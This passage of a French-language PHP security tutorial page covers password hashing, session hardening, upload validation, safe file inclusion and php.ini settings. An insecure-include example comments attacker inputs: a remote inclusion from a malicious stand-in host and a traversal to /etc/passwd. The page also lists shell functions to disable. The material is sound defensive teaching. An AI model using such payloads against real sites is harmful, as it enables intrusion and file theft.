    <span class="function">session_start</span>();
    <span class="variable">$_SESSION</span>[<span class="string">'user_id'</span>] = <span class="variable">$user_id</span>;
    
    <span class="comment">// Vérifiez si un rehashage est nécessaire (si l'algorithme a été mis à jour)</span>
    <span class="keyword">if</span> (<span class="function">password_needs_rehash</span>(<span class="variable">$hash_from_db</span>, <span class="constant">PASSWORD_DEFAULT</span>)) {
        <span class="variable">$newHash</span> = <span class="function">password_hash</span>(<span class="variable">$_POST</span>[<span class="string>'password'</span>], <span class="constant">PASSWORD_DEFAULT</span>);
        <span class="comment">// Mettre à jour le hash dans la base de données</span>
    }
} <span class="keyword">else</span> {
    <span class="comment">// Mot de passe incorrect</span>
    <span class="keyword">echo</span> <span class="string">"Nom d'utilisateur ou mot de passe incorrect"</span>;
}
</code></pre>
                </div>
            </div>

            <h3>Comparaison des algorithmes de hachage</h3>
            <table class="password-table">
                <thead>
                    <tr>
                        <th>Algorithme</th>
                        <th>Disponibilité</th>
                        <th>Sécurité</th>
                        <th>Performance</th>
                        <th>Recommandation</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Argon2id</td>
                        <td>PHP 7.3+</td>
                        <td>Excellente</td>
                        <td>Configurable (mémoire, temps, parallélisme)</td>
                        <td>Hautement recommandé</td>
                    </tr>
                    <tr>
                        <td>bcrypt</td>
                        <td>PHP 5.5+</td>
                        <td>Très bonne</td>
                        <td>Configurable (coût)</td>
                        <td>Recommandé</td>
                    </tr>
                    <tr>
                        <td>PBKDF2</td>
                        <td>Via <code>hash_pbkdf2()</code></td>
                        <td>Bonne</td>
                        <td>Configurable (itérations)</td>
                        <td>Acceptable</td>
                    </tr>
                    <tr>
                        <td>SHA-256/SHA-512</td>
                        <td>Toutes versions</td>
                        <td>Faible (sans sel et itérations)</td>
                        <td>Rapide (problématique)</td>
                        <td>Non recommandé seul</td>
                    </tr>
                    <tr>
                        <td>MD5/SHA-1</td>
                        <td>Toutes versions</td>
                        <td>Très faible</td>
                        <td>Très rapide (problématique)</td>
                        <td>À éviter absolument</td>
                    </tr>
                </tbody>
            </table>

            <div class="warning-box">
                <p><strong>Important :</strong> Plus un algorithme est lent pour calculer un hash, mieux c'est pour la sécurité des mots de passe. Les algorithmes comme bcrypt et Argon2id sont conçus pour être délibérément lents afin de résister aux attaques par force brute.</p>
            </div>

            <h3>Bonnes pratiques pour les mots de passe</h3>
            <div class="security-checklist">
                <div class="checklist-item">Ne stockez jamais les mots de passe en clair ou avec des algorithmes obsolètes (MD5, SHA-1)</div>
                <div class="checklist-item">Utilisez toujours <code>password_hash()</code> avec <code>PASSWORD_DEFAULT</code> ou <code>PASSWORD_ARGON2ID</code></div>
                <div class="checklist-item">Implémentez des politiques de mots de passe forts (longueur minimale, complexité)</div>
                <div class="checklist-item">Proposez l'utilisation d'un gestionnaire de mots de passe à vos utilisateurs</div>
                <div class="checklist-item">Implémentez la vérification contre les mots de passe compromis (API Have I Been Pwned)</div>
                <div class="checklist-item">Mettez en place l'authentification à deux facteurs (2FA) quand c'est possible</div>
                <div class="checklist-item">Limitez les tentatives de connexion échouées (temporisation progressive)</div>
                <div class="checklist-item">Envisagez une expiration périodique des mots de passe pour les données sensibles</div>
            </div>
        </section>

        <section class="section">
            <h2>Sécurité des sessions</h2>
            <p>Les sessions PHP permettent de stocker des données utilisateur côté serveur pendant la navigation. Elles sont cruciales pour maintenir l'état de l'authentification et doivent être correctement sécurisées.</p>

            <h3>Configuration recommandée pour les sessions PHP</h3>
            <div class="example">
                <div class="example-header">Configuration sécurisée des sessions</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="php-tag">&lt;?php</span>
<span class="comment">// Définir les paramètres de cookie de session</span>
<span class="function">ini_set</span>(<span class="string">'session.cookie_httponly'</span>, 1);  <span class="comment">// Empêche l'accès JavaScript au cookie</span>
<span class="function">ini_set</span>(<span class="string">'session.cookie_secure'</span>, 1);    <span class="comment">// Cookies uniquement sur HTTPS</span>
<span class="function">ini_set</span>(<span class="string">'session.cookie_samesite'</span>, <span class="string">'Lax'</span>);  <span class="comment">// Protection CSRF</span>
<span class="function">ini_set</span>(<span class="string">'session.use_strict_mode'</span>, 1);   <span class="comment">// Empêche d'utiliser des ID non créés par PHP</span>
<span class="function">ini_set</span>(<span class="string">'session.gc_maxlifetime'</span>, 1800);  <span class="comment">// 30 minutes d'inactivité maximum</span>

<span class="comment">// Démarrer la session</span>
<span class="function">session_start</span>([
    <span class="string">'cookie_lifetime'</span> => 0,          <span class="comment">// Session détruite à la fermeture du navigateur</span>
    <span class="string">'read_and_close'</span>  => <span class="keyword">true</span>,    <span class="comment">// Option lecture seule (si vous n'écrivez pas dans la session)</span>
]);
<span class="php-tag">?&gt;</span>
</code></pre>
                </div>
            </div>

            <h3>Protection contre la fixation de session</h3>
            <p>La fixation de session est une attaque où un attaquant force un utilisateur à utiliser un ID de session connu. Pour s'en protéger :</p>

            <div class="example">
                <div class="example-header">Régénération de l'ID de session</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="php-tag">&lt;?php</span>
<span class="function">session_start</span>();

<span class="comment">// Lors d'une connexion réussie</span>
<span class="keyword">if</span> (<span class="variable">$login_successful</span>) {
    <span class="comment">// Régénérer l'ID de session pour empêcher la fixation</span>
    <span class="function">session_regenerate_id</span>(<span class="keyword">true</span>); <span class="comment">// true pour supprimer l'ancienne session</span>
    
    <span class="comment">// Stockez les informations utilisateur dans la session</span>
    <span class="variable">$_SESSION</span>[<span class="string">'user_id'</span>] = <span class="variable">$user_id</span>;
    <span class="variable">$_SESSION</span>[<span class="string">'user_ip'</span>] = <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>];
    <span class="variable">$_SESSION</span>[<span class="string">'user_agent'</span>] = <span class="variable">$_SERVER</span>[<span class="string">'HTTP_USER_AGENT'</span>];
    <span class="variable">$_SESSION</span>[<span class="string">'last_activity'</span>] = <span class="function">time</span>();
}
<span class="php-tag">?&gt;</span>
</code></pre>
                </div>
            </div>

            <h3>Expiration automatique des sessions</h3>
            <div class="example">
                <div class="example-header">Vérification du délai d'inactivité</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="php-tag">&lt;?php</span>
<span class="function">session_start</span>();

<span class="comment">// Définir le délai d'expiration (30 minutes)</span>
<span class="variable">$expiration_time</span> = 30 * 60; <span class="comment">// en secondes</span>

<span class="comment">// Vérifier si la session contient un horodatage de dernière activité</span>
<span class="keyword">if</span> (<span class="function">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">'last_activity'</span>])) {
    <span class="comment">// Calculer le temps écoulé</span>
    <span class="variable">$elapsed_time</span> = <span class="function">time</span>() - <span class="variable">$_SESSION</span>[<span class="string">'last_activity'</span>];
    
    <span class="comment">// Vérifier si le délai d'expiration est dépassé</span>
    <span class="keyword">if</span> (<span class="variable">$elapsed_time</span> > <span class="variable">$expiration_time</span>) {
        <span class="comment">// Détruire la session</span>
        <span class="function">session_unset</span>();
        <span class="function">session_destroy</span>();
        <span class="function">header</span>(<span class="string">'Location: login.php?expired=1'</span>);
        <span class="function">exit</span>();
    }
}

<span class="comment">// Mettre à jour l'horodatage de dernière activité</span>
<span class="variable">$_SESSION</span>[<span class="string">'last_activity'</span>] = <span class="function">time</span>();
<span class="php-tag">?&gt;</span>
</code></pre>
                </div>
            </div>

            <div class="warning-box">
                <p><strong>Attention :</strong> Pour des données très sensibles, envisagez d'implémenter des timeouts plus courts (5-15 minutes) et de demander une ré-authentification pour les actions critiques.</p>
            </div>

            <h3>Conseils supplémentaires pour la sécurité des sessions</h3>
            <div class="security-checklist">
                <div class="checklist-item">Validez l'adresse IP et/ou l'User-Agent à chaque requête (avec tolérance pour les IP dynamiques)</div>
                <div class="checklist-item">Stockez les données sensibles de la session cryptées si nécessaire</div>
                <div class="checklist-item">Utilisez un stockage de session personnalisé (base de données, Redis) pour un meilleur contrôle</div>
                <div class="checklist-item">Supprimez ou invalidez les sessions inactives côté serveur régulièrement</div>
                <div class="checklist-item">Fournissez une fonctionnalité de déconnexion qui détruit complètement la session</div>
                <div class="checklist-item">Régénérez l'ID de session lors des changements de niveau de privilèges</div>
            </div>
        </section>

        <section class="section">
            <h2>Sécurité des fichiers et des uploads</h2>
            <p>La gestion des uploads de fichiers est un vecteur d'attaque courant dans les applications web. Un attaquant pourrait tenter d'uploader du code malveillant ou de provoquer des dépassements de mémoire.</p>

            <h3>Validation des fichiers uploadés</h3>
            <div class="example">
                <div class="example-header">Validation sécurisée des uploads</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="php-tag">&lt;?php</span>
<span class="keyword">if</span> (<span class="function">isset</span>(<span class="variable">$_FILES</span>[<span class="string">'file'</span>])) {
    <span class="comment">// Définir les types de fichiers autorisés</span>
    <span class="variable">$allowed_types</span> = [<span class="string">'image/jpeg'</span>, <span class="string">'image/png'</span>, <span class="string">'image/gif'</span>];
    
    <span class="comment">// Taille maximale (5 MB)</span>
    <span class="variable">$max_size</span> = 5 * 1024 * 1024;
    
    <span class="comment">// Vérifier le type MIME du fichier</span>
    <span class="variable">$file_type</span> = <span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'type'</span>];
    <span class="keyword">if</span> (!<span class="function">in_array</span>(<span class="variable">$file_type</span>, <span class="variable">$allowed_types</span>)) {
        <span class="function">die</span>(<span class="string">'Type de fichier non autorisé.'</span>);
    }
    
    <span class="comment">// Vérifier la taille du fichier</span>
    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'size'</span>] > <span class="variable">$max_size</span>) {
        <span class="function">die</span>(<span class="string">'Fichier trop volumineux.'</span>);
    }
    
    <span class="comment">// Générer un nom de fichier unique</span>
    <span class="variable">$new_file_name</span> = <span class="function">md5</span>(<span class="function">uniqid</span>(<span class="function">rand</span>(), <span class="keyword">true</span>)) . <span class="string">'.'</span> . 
                     <span class="function">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'name'</span>], <span class="constant">PATHINFO_EXTENSION</span>);
    
    <span class="comment">// Chemin de destination (hors de la racine web)</span>
    <span class="variable">$upload_dir</span> = <span class="constant">__DIR__</span> . <span class="string">'/../uploads/'</span>;
    <span class="variable">$destination</span> = <span class="variable">$upload_dir</span> . <span class="variable">$new_file_name</span>;
    
    <span class="comment">// Déplacer le fichier vers sa destination</span>
    <span class="keyword">if</span> (<span class="function">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="variable">$destination</span>)) {
        <span class="keyword">echo</span> <span class="string">'Fichier uploadé avec succès.'</span>;
    } <span class="keyword">else</span> {
        <span class="function">die</span>(<span class="string">'Erreur lors de l\'upload du fichier.'</span>);
    }
    
    <span class="comment">// Validation supplémentaire pour les images</span>
    <span class="keyword">if</span> (<span class="function">strpos</span>(<span class="variable">$file_type</span>, <span class="string">'image/'</span>) === 0) {
        <span class="comment">// Vérifier que c'est bien une image valide</span>
        <span class="variable">$image_info</span> = <span class="function">getimagesize</span>(<span class="variable">$destination</span>);
        <span class="keyword">if</span> (<span class="variable">$image_info</span> === <span class="keyword">false</span>) {
            <span class="comment">// Le fichier n'est pas une image valide</span>
            <span class="function">unlink</span>(<span class="variable">$destination</span>); <span class="comment">// Supprimer le fichier</span>
            <span class="function">die</span>(<span class="string">'Le fichier n\'est pas une image valide.'</span>);
        }
    }
}
<span class="php-tag">?&gt;</span>
</code></pre>
                </div>
            </div>

            <h3>Protection des répertoires d'uploads avec .htaccess</h3>
            <p>Pour les serveurs Apache, vous pouvez sécuriser davantage les répertoires d'uploads :</p>

            <div class="example">
                <div class="example-header">Fichier .htaccess pour dossier d'uploads</div>
                <div class="example-content">
                    <pre><code class="language-apache">
<span class="comment"># Désactiver l'exécution des scripts dans ce répertoire</span>
<span class="section">&lt;FilesMatch "\.(?:php|pl|py|cgi|asp|js)$"&gt;</span>
    <span class="keyword">Order</span> <span class="literal">Deny,Allow</span>
    <span class="keyword">Deny</span> <span class="literal">from all</span>
<span class="section">&lt;/FilesMatch&gt;</span>

<span class="comment"># Autoriser seulement certains types de fichiers</span>
<span class="section">&lt;FilesMatch "\.(?:jpg|jpeg|png|gif|pdf|doc|docx|xls|xlsx)$"&gt;</span>
    <span class="keyword">Order</span> <span class="literal">Allow,Deny</span>
    <span class="keyword">Allow</span> <span class="literal">from all</span>
<span class="section">&lt;/FilesMatch&gt;</span>

<span class="comment"># Protection supplémentaire</span>
<span class="keyword">Options</span> <span class="literal">-Indexes -ExecCGI</span>
<span class="keyword">AddHandler</span> <span class="literal">cgi-script</span> <span class="literal">.php .pl .py .jsp .asp .htm .shtml .sh .cgi</span>
<span class="keyword">php_flag</span> <span class="property">engine</span> <span class="literal">off</span>
</code></pre>
                </div>
            </div>

            <h3>Inclusion sécurisée de fichiers</h3>
            <p>Les fonctions d'inclusion de fichiers (<code>include</code>, <code>require</code>) peuvent présenter des risques si elles utilisent des paramètres contrôlés par l'utilisateur :</p>

            <div class="security-comparison">
                <div class="insecure-code">
                    <div class="example-header">
                        <span class="header-title">Inclusion non sécurisée</span>
                        <span class="risk-badge high-risk">Risque élevé</span>
                    </div>
                    <pre><code class="language-php">
<span class="comment">// Inclusion dangereuse basée sur un paramètre GET</span>
<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">'page'</span>];
<span class="function">include</span>(<span class="variable">$page</span> . <span class="string">'.php'</span>);

<span class="comment">// Un attaquant peut utiliser : ?page=http://site-malveillant.com/malware</span>
<span class="comment">// Ou : ?page=../../../etc/passwd%00 (injection null byte)</span>
</code></pre>
                </div>
                <div class="secure-code">
                    <div class="example-header">
                        <span class="header-title">Inclusion sécurisée</span>
                        <span class="risk-badge secure-badge">Sécurisé</span>
                    </div>
                    <pre><code class="language-php">
<span class="comment">// Définir une liste blanche de pages autorisées</span>
<span class="variable">$allowed_pages</span> = [<span class="string">'accueil'</span>, <span class="string">'contact'</span>, <span class="string">'apropos'</span>, <span class="string">'produits'</span>];

<span class="comment">// Récupérer et valider le paramètre</span>
<span class="variable">$page</span> = <span class="function">filter_input</span>(<span class="constant">INPUT_GET</span>, <span class="string">'page'</span>, <span class="constant">FILTER_SANITIZE_STRING</span>);

<span class="comment">// Vérifier si la page est dans la liste autorisée</span>
<span class="keyword">if</span> (<span class="function">in_array</span>(<span class="variable">$page</span>, <span class="variable">$allowed_pages</span>)) {
    <span class="function">include</span>(<span class="string">'pages/'</span> . <span class="variable">$page</span> . <span class="string>'.php'</span>);
} <span class="keyword">else</span> {
    <span class="comment">// Page par défaut</span>
    <span class="function">include</span>(<span class="string">'pages/accueil.php'</span>);
}
</code></pre>
                </div>
            </div>

            <div class="tip-box">
                <p><strong>Conseils supplémentaires pour la sécurité des fichiers :</strong></p>
                <ul>
                    <li>Stockez les fichiers uploadés en dehors de la racine web ou dans un répertoire protégé</li>
                    <li>Renommez systématiquement les fichiers uploadés pour éviter les conflits et les attaques</li>
                    <li>Utilisez des mécanismes d'antivirus si vous acceptez des types de fichiers à risque</li>
                    <li>Préférez <code>include()</code> et <code>require()</code> avec des chemins absolus</li>
                    <li>Validez et sanitisez toujours les données utilisateur avant de les utiliser dans des noms de fichiers</li>
                </ul>
            </div>
        </section>

        <section class="section">
            <h2>Configuration sécurisée de PHP</h2>
            <p>La configuration du serveur PHP joue un rôle crucial dans la sécurité globale de votre application. Certains paramètres par défaut peuvent exposer des informations sensibles ou permettre des comportements dangereux.</p>

            <h3>Directives importantes dans php.ini</h3>
            <div class="secure-config-item">
                <h4>Masquer les informations sensibles</h4>
                <pre><code class="language-ini">
<span class="comment">; Masquer la version et autres informations de PHP</span>
<span class="property">expose_php</span> = <span class="value">Off</span>

<span class="comment">; Désactiver l'affichage des erreurs en production</span>
<span class="property">display_errors</span> = <span class="value">Off</span>
<span class="property">display_startup_errors</span> = <span class="value">Off</span>

<span class="comment">; Journaliser les erreurs à la place</span>
<span class="property">log_errors</span> = <span class="value">On</span>
<span class="property">error_log</span> = <span class="string">/chemin/vers/php_errors.log</span>
</code></pre>
            </div>

            <div class="secure-config-item">
                <h4>Contrôle des ressources et limites</h4>
                <pre><code class="language-ini">
<span class="comment">; Limiter la taille maximale des uploads de fichiers</span>
<span class="property">upload_max_filesize</span> = <span class="value">2M</span>
<span class="property">post_max_size</span> = <span class="value">8M</span>

<span class="comment">; Limiter la durée maximale d'exécution des scripts</span>
<span class="property">max_execution_time</span> = <span class="value">30</span>
<span class="property">max_input_time</span> = <span class="value">60</span>

<span class="comment">; Limiter la consommation de mémoire</span>
<span class="property">memory_limit</span> = <span class="value">128M</span>
</code></pre>
            </div>

            <div class="secure-config-item">
                <h4>Sécurité des sessions</h4>
                <pre><code class="language-ini">
<span class="comment">; Stockage sécurisé des sessions</span>
<span class="property">session.use_strict_mode</span> = <span class="value">1</span>
<span class="property">session.use_cookies</span> = <span class="value">1</span>
<span class="property">session.use_only_cookies</span> = <span class="value">1</span>
<span class="property">session.cookie_secure</span> = <span class="value">1</span>
<span class="property">session.cookie_httponly</span> = <span class="value">1</span>
<span class="property">session.cookie_samesite</span> = <span class="string">"Lax"</span>
<span class="property">session.gc_maxlifetime</span> = <span class="value">1440</span>
</code></pre>
            </div>

            <div class="secure-config-item">
                <h4>Désactiver les fonctionnalités dangereuses</h4>
                <pre><code class="language-ini">
<span class="comment">; Désactiver les fonctions dangereuses</span>
<span class="property">disable_functions</span> = <span class="string">system,exec,shell_exec,passthru,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,phpinfo</span>

<span class="comment">; Désactiver l'inclusion de fichiers distants</span>
<span class="property">allow_url_fopen</span> = <span class="value">Off</span>
<span class="property">allow_url_include</span> = <span class="value">Off</span>
</code></pre>
            </div>

            <h3>Vérifier votre configuration PHP</h3>
            <p>Vous pouvez utiliser un script pour vérifier votre configuration actuelle :</p>

            <div class="example">
                <div class="example-header">Script de vérification de la configuration</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="php-tag">&lt;?php</span>
<span class="comment">// IMPORTANT: À utiliser UNIQUEMENT dans un environnement de développement ou sécurisé</span>
<span class="comment">// Ne pas déployer en production</span>

<span class="variable">$secure_settings</span> = [
    <span class="comment">// Sécurité générale</span>
    <span class="string">'expose_php'</span> => [<span class="string">'value'</span> => <span class="keyword">false</span>, <span class="string">'risk'</span> => <span class="string">'medium'</span>],
    <span class="string">'display_errors'</span> => [<span class="string">'value'</span> => <span class="keyword">false</span>, <span class="string">'risk'</span> => <span class="string>'medium'</span>, <span class="string">'environment'</span> => <span class="string">'production'</span>],
    <span class="string">'log_errors'</span> => [<span class="string">'value'</span> => <span class="keyword">true</span>, <span class="string">'risk'</span> => <span class="string>'medium'</span>],
    
    <span class="comment">// Sécurité des inclusions</span>
    <span class="string">'allow_url_fopen'</span> => [<span class="string">'value'</span> => <span class="keyword">false</span>, <span class="string">'risk'</span> => <span class="string>'high'</span>],
    <span class="string">'allow_url_include'</span> => [<span class="string">'value'</span> => <span class="keyword">false</span>, <span class="string>'risk'</span> => <span class="string>'critical'</span>],
    
    <span class="comment">// Sécurité des sessions</span>
    <span class="string">'session.use_strict_mode'</span> => [<span class="string">'value'</span> => <span class="string>'1'</span>, <span class="string">'risk'</span> => <span class="string>'high'</span>],
    <span class="string">'session.use_only_cookies'</span> => [<span class="string">'value'</span> => <span class="string>'1'</span>, <span class="string">'risk'</span> => <span class="string>'high'</span>],
    <span class="string">'session.cookie_httponly'</span> => [<span class="string">'value'</span> => <span class="string>'1'</span>, <span class="string">'risk'</span> => <span class="string>'high'</span>],
    <span class="string">'session.cookie_secure'</span> => [<span class="string">'value'</span> => <span class="string>'1'</span>, <span class="string">'risk'</span> => <span class="string>'high'</span>],
    <span class="string">'session.cookie_samesite'</span> => [<span class="string">'value'</span> => <span class="string>'Lax'</span>, <span class="string">'risk'</span> => <span class="string>'medium'</span>]
];

<span class="variable">$environment</span> = <span class="string">'development'</span>; <span class="comment">// Changez en 'production' pour la production</span>

<span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Vérification de la configuration PHP&lt;/h2&gt;"</span>;
<span class="keyword">echo</span> <span class="string">"&lt;table border='1' cellpadding='5'&gt;"</span>;
<span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Valeur actuelle&lt;/th&gt;&lt;th&gt;Recommandation&lt;/th&gt;&lt;th&gt;Niveau de risque&lt;/th&gt;&lt;th&gt;Statut&lt;/th&gt;&lt;/tr&gt;"</span>;

<span class="keyword">foreach</span> (<span class="variable">$secure_settings</span> <span class="keyword">as</span> <span class="variable">$directive</span> => <span class="variable">$config</span>) {
    <span class="comment">// Ignorer les directives spécifiques à un environnement</span>
    <span class="keyword">if</span> (<span class="function">isset</span>(<span class="variable">$config</span>[<span class="string">'environment'</span>]) && <span class="variable">$config</span>[<span class="string>'environment'</span>] !== <span class="variable">$environment</span>) {
        <span class="keyword">continue</span>;
    }
    
    <span class="variable">$current_value</span> = <span class="function">ini_get</span>(<span class="variable">$directive</span>);
    <span class="variable">$status</span> = <span class="string">'❌'</span>;
    
    <span class="comment">// Convertir les valeurs string "0"/"1" en booléens pour la comparaison</span>
    <span class="keyword">if</span> (<span class="variable">$current_value</span> === <span class="string">'0'</span>) <span class="variable">$current_value</span> = <span class="keyword">false</span>;
    <span class="keyword">if</span> (<span class="variable">$current_value</span> === <span class="string">'1'</span>) <span class="variable">$current_value</span> = <span class="keyword">true</span>;
    
    <span class="comment">// Comparaison avec la valeur recommandée</span>
    <span class="keyword">if</span> (<span class="function">is_bool</span>(<span class="variable">$config</span>[<span class="string>'value'</span>])) {
        <span class="keyword">if</span> ((<span class="variable">$config</span>[<span class="string>'value'</span>] === <span class="keyword">true</span> && (<span class="variable">$current_value</span> === <span class="keyword">true</span> || <span class="variable">$current_value</span> === <span class="string">'1'</span> || <span class="variable">$current_value</span> === <span class="string">'On'</span>)) || 
            (<span class="variable">$config</span>[<span class="string>'value'</span>] === <span class="keyword">false</span> && (<span class="variable">$current_value</span> === <span class="keyword">false</span> || <span class="variable">$current_value</span> === <span class="string>'0'</span> || <span class="variable">$current_value</span> === <span class="string">'Off'</span> || <span class="variable">$current_value</span> === <span class="string">''</span>))) {
            <span class="variable">$status</span> = <span class="string">'✅'</span>;
        }
    } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$current_value</span> == <span class="variable">$config</span>[<span class="string>'value'</span>]) {
        <span class="variable">$status</span> = <span class="string">'✅'</span>;
    }
    
    <span class="comment">// Afficher la ligne dans le tableau</span>
    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . <span class="function">htmlspecialchars</span>(<span class="variable">$directive</span>) . <span class="string">"&lt;/td&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . <span class="function">htmlspecialchars</span>(<span class="function">is_bool</span>(<span class="variable">$current_value</span>) ? (<span class="variable">$current_value</span> ? <span class="string">'true'</span> : <span class="string">'false'</span>) : <span class="variable">$current_value</span>) . <span class="string">"&lt;/td&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . <span class="function">htmlspecialchars</span>(<span class="function">is_bool</span>(<span class="variable">$config</span>[<span class="string>'value'</span>]) ? (<span class="variable">$config</span>[<span class="string>'value'</span>] ? <span class="string">'true'</span> : <span class="string">'false'</span>) : <span class="variable">$config</span>[<span class="string>'value'</span>]) . <span class="string">"&lt;/td&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"&lt;td style='color: "</span> . (<span class="variable">$config</span>[<span class="string>'risk'</span>] === <span class="string>'critical'</span> ? <span class="string">'red'</span> : (<span class="variable">$config</span>[<span class="string>'risk'</span>] === <span class="string>'high'</span> ? <span class="string">'orangered'</span> : <span class="string">'orange'</span>)) . <span class="string">"'&gt;"</span> . <span class="function">ucfirst</span>(<span class="variable">$config</span>[<span class="string>'risk'</span>]) . <span class="string">"&lt;/td&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . <span class="variable">$status</span> . <span class="string">"&lt;/td&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;
}

<span class="keyword">echo</span> <span class="string">"&lt;/table&gt;"</span>;
<span class="php-tag">?&gt;</span>
</code></pre>
                </div>
            </div>

            <div class="warning-box">
                <p><strong>Important :</strong> Ce script de vérification doit être utilisé uniquement en environnement de développement, puis supprimé avant le déploiement en production. Il expose des informations sur votre configuration qui pourraient être exploitées par des attaquants.</p>
            </div>

            <div class="tip-box">
                <p><strong>Pratiques recommandées :</strong> En plus de configurer correctement php.ini, envisagez d'utiliser des outils comme <code>mod_security</code> pour Apache ou des solutions de pare-feu applicatif web (WAF) pour une protection supplémentaire.</p>
            </div>
        </section>

        <section class="section">
            <h2>Liste de contrôle de sécurité PHP</h2>
            <p>Voici une liste de contrôle complète pour sécuriser vos applications PHP :</p>

            <div class="security-checklist">
                <h3>Sécurité essentielle</h3>
                <div class="checklist-item">Valider et filtrer toutes les entrées utilisateur avec <code>filter_input()</code>, <code>filter_var()</code>, ou des validations spécifiques</div>
                <div class="checklist-item">Utiliser des requêtes préparées PDO pour toutes les opérations de base de données</div>
                <div class="checklist-item">Échapper les sorties avec <code>htmlspecialchars()</code> pour prévenir le XSS</div>
                <div class="checklist-item">Implémenter une protection CSRF pour les formulaires et actions sensibles</div>
                <div class="checklist-item">Utiliser <code>password_hash()</code> et <code>password_verify()</code> pour la gestion des mots de passe</div>
                <div class="checklist-item">Configurer correctement les cookies de session (httpOnly, secure, SameSite)</div>
                <div class="checklist-item">Régénérer l'ID de session après connexion (<code>session_regenerate_id(true)</code>)</div>
                <div class="checklist-item">Valider rigoureusement les uploads de fichiers (type, taille, contenu)</div>
                <div class="checklist-item">Utiliser HTTPS pour toutes les communications</div>
            </div>

            <div class="security-checklist">
                <h3>Sécurité avancée</h3>
                <div class="checklist-item">Mettre en place une authentification à deux facteurs (2FA)</div>
                <div class="checklist-item">Implémenter une politique de limitation des tentatives (rate limiting)</div>
                <div class="checklist-item">Configurer les en-têtes de sécurité HTTP (Content-Security-Policy, X-XSS-Protection, etc.)</div>
                <div class="checklist-item">Utiliser un mécanisme de journalisation des événements de sécurité</div>
                <div class="checklist-item">Mettre en œuvre une gestion d'erreur qui ne divulgue pas d'informations sensibles</div>
                <div class="checklist-item">Effectuer des audits de sécurité réguliers et des tests de pénétration</div>
                <div class="checklist-item">Garder PHP et toutes les dépendances à jour</div>
                <div class="checklist-item">Désactiver les fonctions PHP dangereuses dans la configuration du serveur</div>
                <div class="checklist-item">Stocker les fichiers sensibles en dehors de la racine web</div>
            </div>

            <h3>Ressources de sécurité PHP</h3>
            <ul>
                <li><a href="https://www.php.net/manual/fr/security.php" target="_blank">Manuel PHP: Considérations sur la sécurité</a></li>
                <li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10</a></li>
                <li><a href="https://cheatsheetseries.owasp.org/" target="_blank">OWASP Cheat Sheet Series</a></li>
                <li><a href="https://phpsecurity.readthedocs.io/en/latest/" target="_blank">PHP Security Guide</a></li>
            </ul>
        </section>
    </main>
    <div class="navigation">
        <a href="13-php-ajax.php" class="nav-button">← Module précédent</a>
        <a href="../../index.php" class="nav-button">Accueil</a>
        <a href="15-architecture-mvc.php" class="nav-button">Module suivant →</a>
    </div>
    <script src="../assets/js/highlight.js"></script>
    <script>
        hljs.highlightAll();
    </script>
</body>

</html>
<?php include __DIR__ . '/../includes/footer.php'; ?>